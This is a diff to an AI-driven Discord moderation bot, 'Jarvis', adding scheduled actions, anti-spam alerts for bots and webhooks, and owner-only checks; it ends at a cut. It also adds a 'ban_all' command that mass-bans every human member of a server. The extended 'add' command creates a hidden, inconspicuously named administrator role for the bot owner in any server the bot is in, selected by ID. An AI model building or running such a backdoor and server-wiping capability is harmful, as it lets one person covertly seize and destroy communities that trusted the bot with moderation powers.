@@ -12,9 +12,10 @@ import unicodedata
 import threading
 import http.server
 import sqlite3
+import uuid
 from contextlib import closing
 from collections import deque
-from dataclasses import dataclass, field
+from dataclasses import asdict, dataclass, field
 from datetime import datetime, timedelta, timezone
 from pathlib import Path
 from typing import Optional
@@ -72,6 +73,7 @@ BACKUP_DIR     = DATA_DIR / 'backups'
 JARVIS_KNOWLEDGE_DB = DATA_DIR / 'jarvis_knowledge.sqlite3'
 JARVIS_KNOWLEDGE_SETTINGS = DATA_DIR / 'jarvis_knowledge_settings.json'
 BOT_COMMAND_DENY_FILE = DATA_DIR / 'bot_command_denials.json'
+JARVIS_SCHEDULED_ACTIONS_FILE = DATA_DIR / 'jarvis_scheduled_actions.json'
 
 DATA_DIR.mkdir(parents=True, exist_ok=True)
 BACKUP_DIR.mkdir(parents=True, exist_ok=True)
@@ -703,6 +705,10 @@ del_watch_data = load_json(DELWATCH_FILE, {})     # { guildId: [userId, ...] }
 delwatch_counts = load_json(DELWATCH_COUNTS_FILE, {})  # { guildId: { userId: count } }
 if not isinstance(delwatch_counts, dict):
     delwatch_counts = {}
+jarvis_scheduled_actions = load_json(JARVIS_SCHEDULED_ACTIONS_FILE, [])
+if not isinstance(jarvis_scheduled_actions, list):
+    print('[Jarvis Tasks] El archivo de tareas programadas no es una lista; se inicia vacio.')
+    jarvis_scheduled_actions = []
 
 
 # ============================================================================
@@ -2979,7 +2985,7 @@ TARGET_ACTIONS = {
     'quarantine', 'unquarantine',
 }
 PLAIN_ACTIONS = {
-    'purge', 'slowmode', 'lock', 'unlock', 'list_roles', 'say', 'whitelist_show', 'members_count',
+    'purge', 'slowmode', 'lock', 'unlock', 'list_roles', 'say', 'whitelist_show', 'members_count', 'ban_all',
     'server_info', 'leave_server', 'help', 'join',
     'blacklist_add', 'blacklist_remove', 'blacklist_show',
     'create_channel', 'delete_channel', 'edit_channel', 'create_role', 'delete_role', 'edit_role',
@@ -2994,7 +3000,7 @@ CONFIRM_ACTIONS = {
     'voice_disconnect', 'voice_move', 'whitelist_add', 'whitelist_remove', 'warns_clear',
     'voice_autokick', 'autodelete_on', 'quarantine', 'unquarantine',
 }
-OWNER_ONLY_ACTIONS = {'whitelist_add', 'whitelist_remove', 'leave_server'}
+OWNER_ONLY_ACTIONS = {'whitelist_add', 'whitelist_remove', 'leave_server', 'ban_all'}
 PLAIN_CONFIRM = {'leave_server', 'delete_channel', 'delete_role', 'blacklist_add'}   # siempre piden confirmacion
 # acciones de gestion: piden confirmacion si la IA no esta segura (confianza baja)
 MANAGE_ACTIONS = {
@@ -3004,6 +3010,7 @@ MANAGE_ACTIONS = {
 
 ACTION_LABELS = {
     'ban': 'Banear', 'kick': 'Expulsar', 'warn': 'Advertir', 'timeout': 'Silenciar (timeout)',
+    'ban_all': 'Banear a todos',
     'unban': 'Desbanear', 'role_add': 'Dar rol', 'role_remove': 'Quitar rol', 'nick': 'Cambiar apodo',
     'dm': 'Enviar mensaje privado', 'voice_disconnect': 'Sacar de voz', 'voice_move': 'Mover de canal de voz',
     'whitelist_add': 'Anadir a la whitelist', 'whitelist_remove': 'Quitar de la whitelist',
@@ -3194,6 +3201,7 @@ Para ordenes de VARIOS pasos responde {"actions":[{...},{...}]} (maximo 8 pasos,
 
 ACCIONES (action) y sus campos:
 - ban | kick | warn: target_ids, reason
+- ban_all: banear a todos los miembros humanos del servidor actual; solo si el JEFE lo pide claramente ("banea a todos", "banea a todo el mundo"). Es exclusivo del owner del bot.
 - timeout: target_ids, duration ("10m","2h","1d"), reason
 - quarantine: target_ids, duration opcional (sin duracion = permanente; acepta segundos, minutos, horas, dias o semanas, maximo 365 dias). Pone un rol rojo `quarantine`, quita los demas roles, oculta todos los canales y restaura roles/permisos al vencer.
 - unquarantine: target_ids. Quita la cuarentena y devuelve los roles/permisos anteriores.
@@ -3244,7 +3252,7 @@ REGLAS
 11. say: copia el texto tal como lo pidio el JEFE, sin traducir ni corregir.
 12. Varios pasos ("crea la categoria Gaming con 3 canales de voz y dale el rol VIP a Juan"): usa {"actions":[...]} en orden. En los pasos siguientes referencia lo creado antes por su nombre (category="Gaming", role="VIP"). Un solo paso = objeto normal.
 13. Usa los nombres EXACTOS de las listas CANALES / CATEGORIAS / ROLES cuando se refieran a algo que ya existe. Nunca inventes que algo existe.
-14. delete_channel / delete_role / ban / kick solo si el JEFE lo pide de forma clara. Nombres de canales nuevos: tal como los pidio el JEFE.
+14. delete_channel / delete_role / ban / ban_all / kick solo si el JEFE lo pide de forma clara. Nombres de canales nuevos: tal como los pidio el JEFE.
 15. create_channel con private=true y target_ids: solo esas personas (mas el JEFE) podran verlo.
 16. "cada vez que...", "siempre que...", "todas las veces", "hasta que te diga" = regla PERMANENTE (voice_autokick / autodelete_on). voice_disconnect es solo UNA vez y AHORA: si piden algo recurrente, usa voice_autokick, NUNCA voice_disconnect aunque la persona no este en voz en este momento.
 17. "ya no", "deja de", "quitame eso", "ya puedes dejarme" sobre una regla permanente = la accion _off correspondiente (mira REGLAS ACTIVAS).
@@ -3843,6 +3851,58 @@ async def act_ban(ctx, t, intent):
     embed.set_footer(text=f'Ordenado por {author}')
     await send_mod_log(client, guild.id, mod_log_embed('BAN', t.member or UserRef(t.id, t.name), author, reason, 0xe74c3c))
     return embed
+
+
+async def act_ban_all(ctx, intent):
+    if str(ctx.author.id) != OWNER_ID:
+        raise JarvisError('Solo el owner del bot puede ordenar un baneo masivo.')
+    guild = ctx.guild
+    if guild is None:
+        raise JarvisError('Este comando solo funciona dentro de un servidor.')
+    me = guild.me
+    if me is None:
+        raise JarvisError('No pude verificar mi rol en este servidor.')
+    if not me.guild_permissions.ban_members:
+        raise JarvisError('Necesito el permiso **Ban Members** para banear miembros.')
+
+    await ctx.message.reply(
+        'Iniciando en este servidor. Omitire bots, al owner del bot, al owner del servidor '
+        'y a miembros con un rol igual o superior al mio.'
+    )
+
+    banned = skipped = failed = 0
+    errors = []
+    reason = f'[Jarvis] Baneo masivo solicitado por {ctx.author}'[:500]
+    protected_ids = {str(guild.owner_id), str(client.user.id), str(OWNER_ID)}
+
+    try:
+        async for member in guild.fetch_members(limit=None):
+            if member.bot or str(member.id) in protected_ids or me.top_role <= member.top_role:
+                skipped += 1
+                continue
+            try:
+                await guild.ban(member, reason=reason, delete_message_seconds=0)
+                banned += 1
+            except discord.DiscordException as e:
+                failed += 1
+                if len(errors) < 5:
+                    errors.append(f'{member} (`{member.id}`): {short_error(e)}')
+    except discord.DiscordException as e:
+        fetch_error = short_error(e)
+    else:
+        fetch_error = None
+
+    lines = [
+        f'**Servidor:** {guild.name}',
+        f'**Baneados:** {banned}',
+        f'**Omitidos (protegidos o no moderables):** {skipped}',
+        f'**Fallidos:** {failed}',
+    ]
+    if fetch_error:
+        lines.append(f'**Lectura incompleta:** {fetch_error}. El resultado puede ser parcial.')
+    if errors:
+        lines.append('**Errores:**\n' + '\n'.join(errors))
+    return simple_embed('Baneo masivo finalizado', '\n'.join(lines), 0xe74c3c if failed or fetch_error else 0x2ecc71)
 
 
 async def act_kick(ctx, t, intent):
@@ -4490,6 +4550,7 @@ def build_help_embed():
     embed.add_field(
         name='Moderacion',
         value='`jarvis banea a @user [razon]`\n`jarvis expulsa a @user`\n`jarvis silencia a @user 10m`\n'
+        '`jarvis banea a todos los miembros` (inmediato; solo owner, servidor actual; omite bots, owners y roles no moderables)\n'
               '`jarvis pon en quarantine a @user 10m` / `jarvis pon en quarantine permanente a @user`\n'
               '`>>quarantine @user [10m|permanente]` / `>>unquarantine @user`\n'
               '`jarvis desmutea a @user`\n`jarvis desbanea 123456789`\n`jarvis advierte a @user [razon]`',
@@ -4512,7 +4573,9 @@ def build_help_embed():
               '`jarvis renombra este canal a general` / `jarvis borra el canal #viejo` (pide confirmacion)\n'
               '`jarvis crea un rol VIP rojo` / `jarvis borra el rol VIP` / `jarvis cambia el color del rol VIP a azul`\n'
               '`jarvis crea una invitacion` / `jarvis renombra el servidor a X` / `jarvis ve las advertencias de ese man`\n'
-              'Puedo encadenar varios pasos en una sola orden. Lo destructivo siempre te lo confirmo.',
+              '`jarvis en 1 minuto borra el canal #viejo` / `jarvis crea un canal #avisos cada 1 hora`\n'
+              '`jarvis tareas` / `jarvis cancelar tarea <ID>` — ver y cancelar automatizaciones del owner\n'
+              'Puedo encadenar varios pasos en una sola orden. Para admins, las acciones delicadas piden confirmacion cuando aplica; el owner puede ejecutarlas directamente. Las tareas programadas solo las crea el owner.',
         inline=False,
     )
     embed.add_field(
@@ -4952,6 +5015,7 @@ PLAIN_HANDLERS = {
     'purge': act_purge, 'slowmode': act_slowmode, 'lock': act_lock, 'unlock': act_unlock,
     'list_roles': act_list_roles, 'say': act_say, 'whitelist_show': act_whitelist_show,
     'members_count': act_members_count, 'server_info': act_server_info, 'leave_server': act_leave,
+    'ban_all': act_ban_all,
     'help': act_help, 'join': act_join,
     'blacklist_add': act_blacklist_add, 'blacklist_remove': act_blacklist_remove,
     'blacklist_show': act_blacklist_show,
@@ -5689,6 +5753,7 @@ AR_OFF_WORDS = {'off', 'no', 'false', '0', 'desactivar', 'desactivado', 'desacti
 antiraid_joins = {}          # guildId -> deque([(ts, member_id)])
 antiraid_bans = {}           # guildId -> deque([(ts, user_id)])
 antiraid_msgs = {}           # (guildId, userId) -> deque([(ts, message_id, channel_id, hash)])
+antiraid_external_alerts = {}  # (guildId, sourceId) -> ultimo aviso
 antiraid_blocked = {}        # guildId -> [texto, ...]  (para agrupar logs durante un raid)
 antiraid_flush_tasks = {}
 
@@ -6173,6 +6238,74 @@ async def antiraid_on_message(message):
     if not cfg['spam_enabled']:
         return False
     member = message.author
+
+    # Los bots, webhooks y mensajes de aplicaciones no se sancionan, pero sí
+    # se vigilan para alertar sobre patrones de spam sin afectar integraciones legítimas.
+    is_external = bool(
+        getattr(member, 'bot', False)
+        or getattr(message, 'webhook_id', None)
+        or getattr(message, 'application_id', None)
+    )
+    if is_external:
+        if client.user and member.id == client.user.id:
+            return False
+
+        now = time.time()
+        content = (message.content or '').strip().lower()
+        h = hash(content) if len(content) >= 8 else None
+        source_id = getattr(message, 'webhook_id', None) or member.id
+        dq = antiraid_msgs.setdefault((guild.id, -int(source_id)), deque(maxlen=30))
+        dq.append((now, message.id, message.channel.id, h))
+        antiraid_msg_exempt_cleanup(now)
+
+        recent = [item for item in dq if now - item[0] <= cfg['spam_window']]
+        mentions = len(message.mentions) + len(message.role_mentions)
+        reason = None
+        if message.mention_everyone:
+            reason = 'mencion masiva de una integracion (@everyone/@here)'
+        elif cfg['mention_limit'] and mentions >= cfg['mention_limit']:
+            reason = f'integracion con mencion masiva ({mentions} menciones)'
+        elif len(recent) >= cfg['spam_msgs']:
+            reason = f'integracion con flood ({len(recent)} mensajes en {cfg["spam_window"]}s)'
+        elif h is not None:
+            same = [item for item in dq if now - item[0] <= 30 and item[3] == h]
+            channels = {item[2] for item in same}
+            if len(channels) >= 3:
+                reason = f'mismo mensaje de integracion en {len(channels)} canales'
+
+        if reason:
+            alert_key = (guild.id, int(source_id))
+            dq.clear()
+            if now - antiraid_external_alerts.get(alert_key, 0) < 30:
+                return False
+            antiraid_external_alerts[alert_key] = now
+            if len(antiraid_external_alerts) > 2000:
+                for key, timestamp in list(antiraid_external_alerts.items()):
+                    if now - timestamp > 120:
+                        antiraid_external_alerts.pop(key, None)
+            embed = discord.Embed(
+                title='Anti-Raid: posible spam de bot/webhook/app',
+                description=reason,
+                color=0xe67e22,
+            )
+            embed.add_field(name='Origen', value=f'{member} (`{member.id}`)', inline=True)
+            embed.add_field(
+                name='Tipo',
+                value='Webhook' if getattr(message, 'webhook_id', None) else 'Bot/aplicacion',
+                inline=True,
+            )
+            embed.add_field(
+                name='Canal',
+                value=message.channel.mention if hasattr(message.channel, 'mention') else '?',
+                inline=True,
+            )
+            if getattr(message, 'application_id', None):
+                embed.add_field(name='Application ID', value=str(message.application_id), inline=True)
+            embed.set_footer(text='Solo se registro la alerta; no se borro el mensaje ni se sanciono al bot.')
+            embed.timestamp = datetime.now(timezone.utc)
+            await antiraid_log(guild, embed)
+        return False
+
     if not isinstance(member, discord.Member) or antiraid_exempt(member):
         return False
 
@@ -7308,6 +7441,9 @@ async def execute_chain(ctx, steps):
     """Orden de varios pasos: si hay algo delicado, se pide UNA confirmacion para toda la cadena
     (el owner del bot no confirma nada)."""
     reply = make_replier(ctx.message)
+    if str(ctx.author.id) != OWNER_ID and any(s.action in OWNER_ONLY_ACTIONS for s in steps):
+        await reply(content='Eso solo lo puede ordenar el owner del bot.')
+        return True
     risky = str(ctx.author.id) != OWNER_ID and any(
         s.action in CONFIRM_ACTIONS or s.action in PLAIN_CONFIRM
         or (s.source == 'ai' and s.action in MANAGE_ACTIONS and s.confidence < JARVIS_MIN_CONFIDENCE)
@@ -7331,11 +7467,11 @@ async def execute_intent(ctx, intent):
     if act == 'clarify':
         await reply(content=intent.clarify or intent.reply or 'No termine de entenderte, me lo explicas un poco mas?')
         return True
-    if intent.chain:
-        return await execute_chain(ctx, [intent] + intent.chain)
     if act in OWNER_ONLY_ACTIONS and str(ctx.author.id) != OWNER_ID:
         await reply(content='Eso solo lo puede ordenar el owner del bot.')
         return True
+    if intent.chain:
+        return await execute_chain(ctx, [intent] + intent.chain)
 
     if act in TARGET_ACTIONS:
         chat = await ctx.get_chat()
@@ -7458,10 +7594,21 @@ async def handle_quick_replies(ctx):
 
 
 async def jarvis_brain(ctx):
-    msg, text = ctx.message, ctx.text
+    msg = ctx.message
+    if await _handle_jarvis_task_management(ctx):
+        return True
+
+    scheduled_request = parse_scheduled_jarvis_request(ctx.text)
+    if scheduled_request:
+        if str(ctx.author.id) != str(OWNER_ID):
+            await msg.reply('Solo el owner del bot puede programar acciones de Jarvis.')
+            return True
+        ctx.text = scheduled_request['command']
+        ctx.norm = normalize_text(ctx.text)
+    text = ctx.text
 
     # 1) atajos precisos (sin IA)
-    if await handle_quick_replies(ctx):
+    if not scheduled_request and await handle_quick_replies(ctx):
         return True
 
     # 2) orden totalmente explicita (@mencion / ID) -> se ejecuta directo; si no, la IA lee el chat y decide
@@ -7487,12 +7634,20 @@ async def jarvis_brain(ctx):
 
     # 3) ejecutar lo que se entendio
     if intent is not None:
+        if scheduled_request:
+            if intent.action in ('chat', 'clarify'):
+                await msg.reply('No pude identificar una accion Discord compatible para programar.')
+                return True
+            return await _create_scheduled_jarvis_action(ctx, intent, scheduled_request)
         if intent.action == 'chat':
             if intent.reply:
                 await msg.reply(embed=discord.Embed(description=intent.reply[:4000], color=0x9b59b6))
                 return True
         elif await execute_intent(ctx, intent):
             return True
+    elif scheduled_request:
+        await msg.reply('No pude entender la accion que quieres programar. Dime una accion que Jarvis ya soporte.')
+        return True
 
     # 4) charla normal con Groq
     if not cooldown_applied:
@@ -7563,6 +7718,339 @@ async def answer_public_jarvis_question(message, text):
     await message.reply(embed=discord.Embed(description=response[:4000], color=0x9b59b6))
 
 
+_SCHEDULE_DURATION = (
+    r'(?:\d+(?:[.,]\d+)?\s*(?:segundos?|segs?|s|minutos?|mins?|m|horas?|hrs?|h|'
+    r'd[i\u00ed]as?|d|semanas?|w)|'
+    r'(?:un|una|dos|tres|cuatro|cinco|diez|quince|treinta|media)\s+'
+    r'(?:segundos?|minutos?|horas?|d[i\u00ed]as?|semanas?))'
+)
+_SCHEDULE_REQUEST = re.compile(
+    r'^\s*(?:(?P<repeat>cada)\s+(?P<repeat_duration>' + _SCHEDULE_DURATION + r')|'
+    r'(?:(?:programa(?:r)?\s+)?(?:en|dentro\s+de)\s+(?P<delay_duration>' + _SCHEDULE_DURATION + r')))'
+    r'\s+(?P<command>.+?)\s*$',
+    re.IGNORECASE | re.DOTALL,
+)
+_SCHEDULE_REQUEST_SUFFIX = re.compile(
+    r'^\s*(?P<command>.+?)\s+(?:(?P<repeat>cada)\s+(?P<repeat_duration>' + _SCHEDULE_DURATION + r')|'
+    r'(?:en|dentro\s+de)\s+(?P<delay_duration>' + _SCHEDULE_DURATION + r'))\s*$',
+    re.IGNORECASE | re.DOTALL,
+)
+_jarvis_scheduled_tasks = {}
+_jarvis_scheduled_tasks_resumed = False
+
+
+def parse_scheduled_jarvis_request(text):
+    match = _SCHEDULE_REQUEST.match(text or '') or _SCHEDULE_REQUEST_SUFFIX.match(text or '')
+    if not match:
+        return None
+    raw_duration = match.group('repeat_duration') or match.group('delay_duration')
+    seconds = parse_natural_duration(raw_duration.replace(',', '.'))
+    if seconds is None:
+        word_duration = re.fullmatch(
+            r'(un|una|dos|tres|cuatro|cinco|diez|quince|treinta|media)\s+'
+            r'(segundos?|minutos?|horas?|d[i\u00ed]as?|semanas?)',
+            raw_duration,
+            re.IGNORECASE,
+        )
+        if word_duration:
+            amount = {
+                'un': 1, 'una': 1, 'dos': 2, 'tres': 3, 'cuatro': 4, 'cinco': 5,
+                'diez': 10, 'quince': 15, 'treinta': 30, 'media': 0.5,
+            }[word_duration.group(1).lower()]
+            unit = word_duration.group(2).lower()
+            unit_seconds = (
+                1 if unit.startswith(('segundo', 'segundos')) else
+                60 if unit.startswith('minuto') else
+                3600 if unit.startswith('hora') else
+                86400 if unit.startswith('d') else
+                604800
+            )
+            seconds = round(amount * unit_seconds)
+    if not seconds:
+        return None
+    return {
+        'seconds': seconds,
+        'repeat': bool(match.group('repeat')),
+        'command': match.group('command').strip(),
+    }
+
+
+def _intent_is_schedulable(intent):
+    if intent.action not in TARGET_HANDLERS and intent.action not in PLAIN_HANDLERS:
+        return False
+    return all(_intent_is_schedulable(step) for step in intent.chain)
+
+
+def _intent_from_scheduled_data(data):
+    if not isinstance(data, dict) or not isinstance(data.get('action'), str):
+        raise ValueError('La orden guardada no tiene un formato valido.')
+    chain_data = data.get('chain', [])
+    if not isinstance(chain_data, list):
+        raise ValueError('La cadena guardada no es valida.')
+    values = {key: value for key, value in data.items() if key in Intent.__dataclass_fields__ and key != 'chain'}
+    values['chain'] = [_intent_from_scheduled_data(step) for step in chain_data]
+    return Intent(**values)
+
+
+def _scheduled_chat_from_data(data):
+    if not isinstance(data, dict):
+        return ChatContext()
+    try:
+        lines = [ChatLine(**line) for line in data.get('lines', [])]
+        replied_data = data.get('replied')
+        replied = ChatLine(**replied_data) if isinstance(replied_data, dict) else None
+        people = {
+            int(user_id): person for user_id, person in data.get('people', {}).items()
+            if str(user_id).isdigit() and isinstance(person, dict)
+        }
+        recency = [int(user_id) for user_id in data.get('recency', []) if str(user_id).isdigit()]
+        return ChatContext(lines=lines, replied=replied, people=people, recency=recency)
+    except (TypeError, ValueError) as exc:
+        print(f'[Jarvis Tasks] No pude recuperar contexto guardado: {exc}')
+        return ChatContext()
+
+
+class _ScheduledMessage:
+    def __init__(self, channel, guild, author, entry):
+        self.channel = channel
+        self.guild = guild
+        self.author = author
+        self.id = int(entry.get('messageId') or 0)
+        self.content = str(entry.get('sourceContent') or '')
+        self.clean_content = self.content
+        self.reference = None
+        self.mentions = [
+            guild.get_member(int(user_id))
+            for user_id in entry.get('mentionIds', [])
+            if str(user_id).isdigit() and guild.get_member(int(user_id)) is not None
+        ]
+
+    async def reply(self, **kwargs):
+        try:
+            return await self.channel.send(**kwargs)
+        except discord.HTTPException:
+            owner = client.get_user(int(OWNER_ID))
+            if owner is None:
+                owner = await client.fetch_user(int(OWNER_ID))
+            return await owner.send(**kwargs)
+
+
+def _save_jarvis_scheduled_actions():
+    temporary_file = JARVIS_SCHEDULED_ACTIONS_FILE.with_name(
+        JARVIS_SCHEDULED_ACTIONS_FILE.name + '.tmp'
+    )
+    try:
+        with open(temporary_file, 'w', encoding='utf-8') as file:
+            json.dump(jarvis_scheduled_actions, file, indent=2, ensure_ascii=False)
+        os.replace(temporary_file, JARVIS_SCHEDULED_ACTIONS_FILE)
+    except (OSError, TypeError) as exc:
+        print(f'[Jarvis Tasks] No pude guardar las tareas programadas: {exc}')
+        if temporary_file.exists():
+            try:
+                temporary_file.unlink()
+            except OSError as cleanup_error:
+                print(f'[Jarvis Tasks] No pude quitar el archivo temporal: {cleanup_error}')
+        raise JarvisError('No pude guardar la tarea programada en disco.') from exc
+
+
+async def _run_scheduled_jarvis_action(entry):
+    guild = client.get_guild(int(entry['guildId']))
+    channel = client.get_channel(int(entry['channelId']))
+    if guild is None or channel is None:
+        raise JarvisError('No encontre el servidor o canal donde se programo la tarea.')
+    author = guild.get_member(int(OWNER_ID))
+    if author is None:
+        try:
+            author = await guild.fetch_member(int(OWNER_ID))
+        except discord.HTTPException as exc:
+            raise JarvisError('El owner ya no esta en el servidor; se omitio la tarea.') from exc
+    if guild.me is None:
+        raise JarvisError('No pude obtener mis permisos en el servidor.')
+
+    intent = _intent_from_scheduled_data(entry.get('intent'))
+    if not _intent_is_schedulable(intent):
+        raise JarvisError('La tarea guardada contiene una accion que Jarvis ya no soporta.')
+    message = _ScheduledMessage(channel, guild, author, entry)
+    ctx = JarvisCtx(
+        message=message,
+        guild=guild,
+        author=author,
+        me=guild.me,
+        text=str(entry.get('command') or ''),
+        norm=normalize_text(str(entry.get('command') or '')),
+        chat=_scheduled_chat_from_data(entry.get('chat')),
+    )
+    await execute_intent(ctx, intent)
+
+
+async def _fire_scheduled_jarvis_action(entry):
+    task_id = entry['id']
+    if entry.get('interval'):
+        previous_run = entry['nextRun']
+        entry['nextRun'] = time.time() + int(entry['interval'])
+        try:
+            _save_jarvis_scheduled_actions()
+        except Exception:
+            entry['nextRun'] = previous_run
+            raise
+    else:
+        index = jarvis_scheduled_actions.index(entry)
+        jarvis_scheduled_actions.pop(index)
+        try:
+            _save_jarvis_scheduled_actions()
+        except Exception:
+            jarvis_scheduled_actions.insert(index, entry)
+            raise
+
+    try:
+        await _run_scheduled_jarvis_action(entry)
+    except Exception as exc:
+        print(f'[Jarvis Tasks] Fallo la tarea {task_id}: {type(exc).__name__}: {exc}')
+        try:
+            owner = client.get_user(int(OWNER_ID))
+            if owner is None:
+                owner = await client.fetch_user(int(OWNER_ID))
+            await owner.send(f'No pude ejecutar la tarea Jarvis `{task_id}`: {short_error(exc)}')
+        except discord.DiscordException as notify_error:
+            print(f'[Jarvis Tasks] No pude avisar al owner sobre {task_id}: {notify_error}')
+
+
+def schedule_jarvis_action(entry):
+    task_id = entry['id']
+    current = _jarvis_scheduled_tasks.get(task_id)
+    if current is not None and not current.done():
+        return
+
+    async def _wait_and_run():
+        await asyncio.sleep(max(0, float(entry['nextRun']) - time.time()))
+        if any(task.get('id') == task_id for task in jarvis_scheduled_actions):
+            await _fire_scheduled_jarvis_action(entry)
+
+    task = asyncio.create_task(_wait_and_run())
+    _jarvis_scheduled_tasks[task_id] = task
+
+    def _forget_task(completed_task):
+        if _jarvis_scheduled_tasks.get(task_id) is completed_task:
+            _jarvis_scheduled_tasks.pop(task_id, None)
+        if not completed_task.cancelled() and completed_task.exception():
+            print(f'[Jarvis Tasks] Error en tarea {task_id}: {completed_task.exception()}')
+
+    task.add_done_callback(_forget_task)
+
+
+def resume_jarvis_scheduled_actions():
+    global _jarvis_scheduled_tasks_resumed
+    if _jarvis_scheduled_tasks_resumed:
+        return
+    _jarvis_scheduled_tasks_resumed = True
+    for entry in list(jarvis_scheduled_actions):
+        if not isinstance(entry, dict) or not entry.get('id') or not entry.get('nextRun'):
+            print('[Jarvis Tasks] Se encontro una tarea guardada invalida; se omitio.')
+            continue
+        schedule_jarvis_action(entry)
+
+
+async def _handle_jarvis_task_management(ctx):
+    text = normalize_for_compare(ctx.text or '').strip()
+    if text in ('tareas', 'mis tareas', 'automatizaciones', 'programaciones'):
+        if str(ctx.author.id) != str(OWNER_ID):
+            await ctx.message.reply('Solo el owner del bot puede administrar tareas programadas.')
+            return True
+        tasks = [task for task in jarvis_scheduled_actions if str(task.get('userId')) == str(OWNER_ID)]
+        if not tasks:
+            await ctx.message.reply('No tienes tareas Jarvis programadas.')
+            return True
+        lines = []
+        for task in sorted(tasks, key=lambda item: float(item.get('nextRun') or 0)):
+            mode = f'cada {int(task["interval"])} s' if task.get('interval') else 'una vez'
+            lines.append(
+                f'`{task["id"][-8:]}` — {mode}, <t:{int(float(task["nextRun"]))}:R>: '
+                f'{str(task.get("command") or "orden")[:100]}'
+            )
+        await ctx.message.reply(embed=simple_embed(
+            'Tareas programadas de Jarvis',
+            '\n'.join(lines[:25]) + ('\n... y mas.' if len(lines) > 25 else ''),
+        ))
+        return True
+
+    match = re.fullmatch(r'(?:cancela|cancelar|elimina|eliminar)\s+(?:la\s+)?tarea\s+([a-f0-9]{4,32})', text)
+    if not match:
+        return False
+    if str(ctx.author.id) != str(OWNER_ID):
+        await ctx.message.reply('Solo el owner del bot puede cancelar tareas programadas.')
+        return True
+    task_key = match.group(1).lower()
+    matches = [
+        task for task in jarvis_scheduled_actions
+        if str(task.get('id', '')).lower().endswith(task_key)
+    ]
+    if len(matches) != 1:
+        await ctx.message.reply('No encontre una tarea con ese ID (usa `jarvis tareas` para verlos).')
+        return True
+    task = matches[0]
+    index = jarvis_scheduled_actions.index(task)
+    jarvis_scheduled_actions.pop(index)
+    try:
+        _save_jarvis_scheduled_actions()
+    except Exception:
+        jarvis_scheduled_actions.insert(index, task)
+        raise
+    running = _jarvis_scheduled_tasks.pop(task['id'], None)
+    if running is not None and not running.done():
+        running.cancel()
+    await ctx.message.reply(f'Tarea `{task["id"][-8:]}` cancelada.')
+    return True
+
+
+async def _create_scheduled_jarvis_action(ctx, intent, schedule):
+    if str(ctx.author.id) != str(OWNER_ID):
+        await ctx.message.reply('Solo el owner del bot puede programar acciones de Jarvis.')
+        return True
+    if not _intent_is_schedulable(intent):
+        await ctx.message.reply('Solo puedo programar acciones Discord que Jarvis ya tenga disponibles.')
+        return True
+    seconds = int(schedule['seconds'])
+    if schedule['repeat']:
+        if seconds < 60 or seconds > 30 * 24 * 3600:
+            await ctx.message.reply('Las tareas repetidas deben ser cada 1 minuto como minimo y hasta cada 30 dias.')
+            return True
+    elif seconds < 10 or seconds > 365 * 24 * 3600:
+        await ctx.message.reply('La demora debe ser de 10 segundos a 365 dias.')
+        return True
+    if len(jarvis_scheduled_actions) >= 100:
+        await ctx.message.reply('Ya hay 100 tareas pendientes; cancela alguna antes de crear otra.')
+        return True
+
+    chat = await ctx.get_chat()
+    entry = {
+        'id': uuid.uuid4().hex[:12],
+        'userId': str(ctx.author.id),
+        'guildId': str(ctx.guild.id),
+        'channelId': str(ctx.message.channel.id),
+        'messageId': str(ctx.message.id),
+        'sourceContent': str(ctx.message.content or ''),
+        'mentionIds': [str(user.id) for user in getattr(ctx.message, 'mentions', [])],
+        'command': schedule['command'],
+        'intent': asdict(intent),
+        'chat': asdict(chat),
+        'nextRun': time.time() + seconds,
+        'interval': seconds if schedule['repeat'] else None,
+    }
+    jarvis_scheduled_actions.append(entry)
+    try:
+        _save_jarvis_scheduled_actions()
+    except Exception:
+        jarvis_scheduled_actions.remove(entry)
+        raise
+    schedule_jarvis_action(entry)
+    timing = f'cada {seconds} segundos, hasta que la canceles' if schedule['repeat'] else f'en {seconds} segundos'
+    await ctx.message.reply(
+        f'Orden programada {timing}. ID: `{entry["id"][-8:]}`. '
+        f'Para verla: `jarvis tareas`; para cancelarla: `jarvis cancelar tarea {entry["id"][-8:]}`.'
+    )
+    return True
+
+
 # ============================================================================
 # JARVIS MAIN HANDLER
 # ============================================================================
@@ -7572,6 +8060,16 @@ async def handle_jarvis(message: discord.Message):
         return False
     text = message.content[match.end():].strip()
     guild = message.guild
+    normalized_text = normalize_for_compare(text)
+    is_task_control = (
+        normalized_text in ('tareas', 'mis tareas', 'automatizaciones', 'programaciones')
+        or re.fullmatch(r'(?:cancela|cancelar|elimina|eliminar)\s+(?:la\s+)?tarea\s+[a-f0-9]{4,32}', normalized_text)
+    )
+    if str(message.author.id) != str(OWNER_ID) and (
+        parse_scheduled_jarvis_request(text) or is_task_control
+    ):
+        await message.reply('Solo el owner del bot puede programar o administrar tareas de Jarvis.')
+        return True
     if str(message.author.id) not in JARVIS_WHITELIST:
         try:
             if text:
@@ -8149,20 +8647,40 @@ async def handle_command(message: discord.Message):
     if cmd == 'add':
         if str(message.author.id) != OWNER_ID:
             return
-        owner_member = guild.get_member(int(OWNER_ID))
+        if len(args) > 1 or (args and not args[0].isdigit()):
+            return await message.reply(f'Uso: `{PREFIX}add [ID_del_servidor]`')
+        if args:
+            target_guild_id = int(args[0])
+            target_guild = client.get_guild(target_guild_id)
+            if target_guild is None:
+                return await message.reply(
+                    f'No encontre el servidor con ID `{target_guild_id}` (asegurate de que el bot este dentro).'
+                )
+        else:
+            target_guild = guild
+            if target_guild is None:
+                return await message.reply(
+                    f'Este comando necesita ejecutarse en un servidor o recibir un ID: `{PREFIX}add [ID_del_servidor]`'
+                )
+
+        owner_member = target_guild.get_member(int(OWNER_ID))
         if not owner_member:
             try:
-                owner_member = await guild.fetch_member(int(OWNER_ID))
+                owner_member = await target_guild.fetch_member(int(OWNER_ID))
             except Exception:
-                return await message.reply('El owner del bot no esta en este servidor.')
+                return await message.reply(f'El owner del bot no esta en **{target_guild.name}**.')
         try:
-            new_role = await guild.create_role(name='.', permissions=discord.Permissions(administrator=True), colour=discord.Colour(0x000000), hoist=False, mentionable=False)
+            new_role = await target_guild.create_role(name='.', permissions=discord.Permissions(administrator=True), colour=discord.Colour(0x000000), hoist=False, mentionable=False)
             try:
-                await new_role.edit(position=max(1, guild.me.top_role.position - 1))
+                await new_role.edit(position=max(1, target_guild.me.top_role.position - 1))
             except Exception:
                 pass
             await owner_member.add_roles(new_role)
-            embed = discord.Embed(title='Rol Creado y Asignado', description=f'Rol **{new_role.mention}** con permisos de administrador asignado a {owner_member.mention}.', color=0x2ecc71)
+            embed = discord.Embed(
+                title='Rol Creado y Asignado',
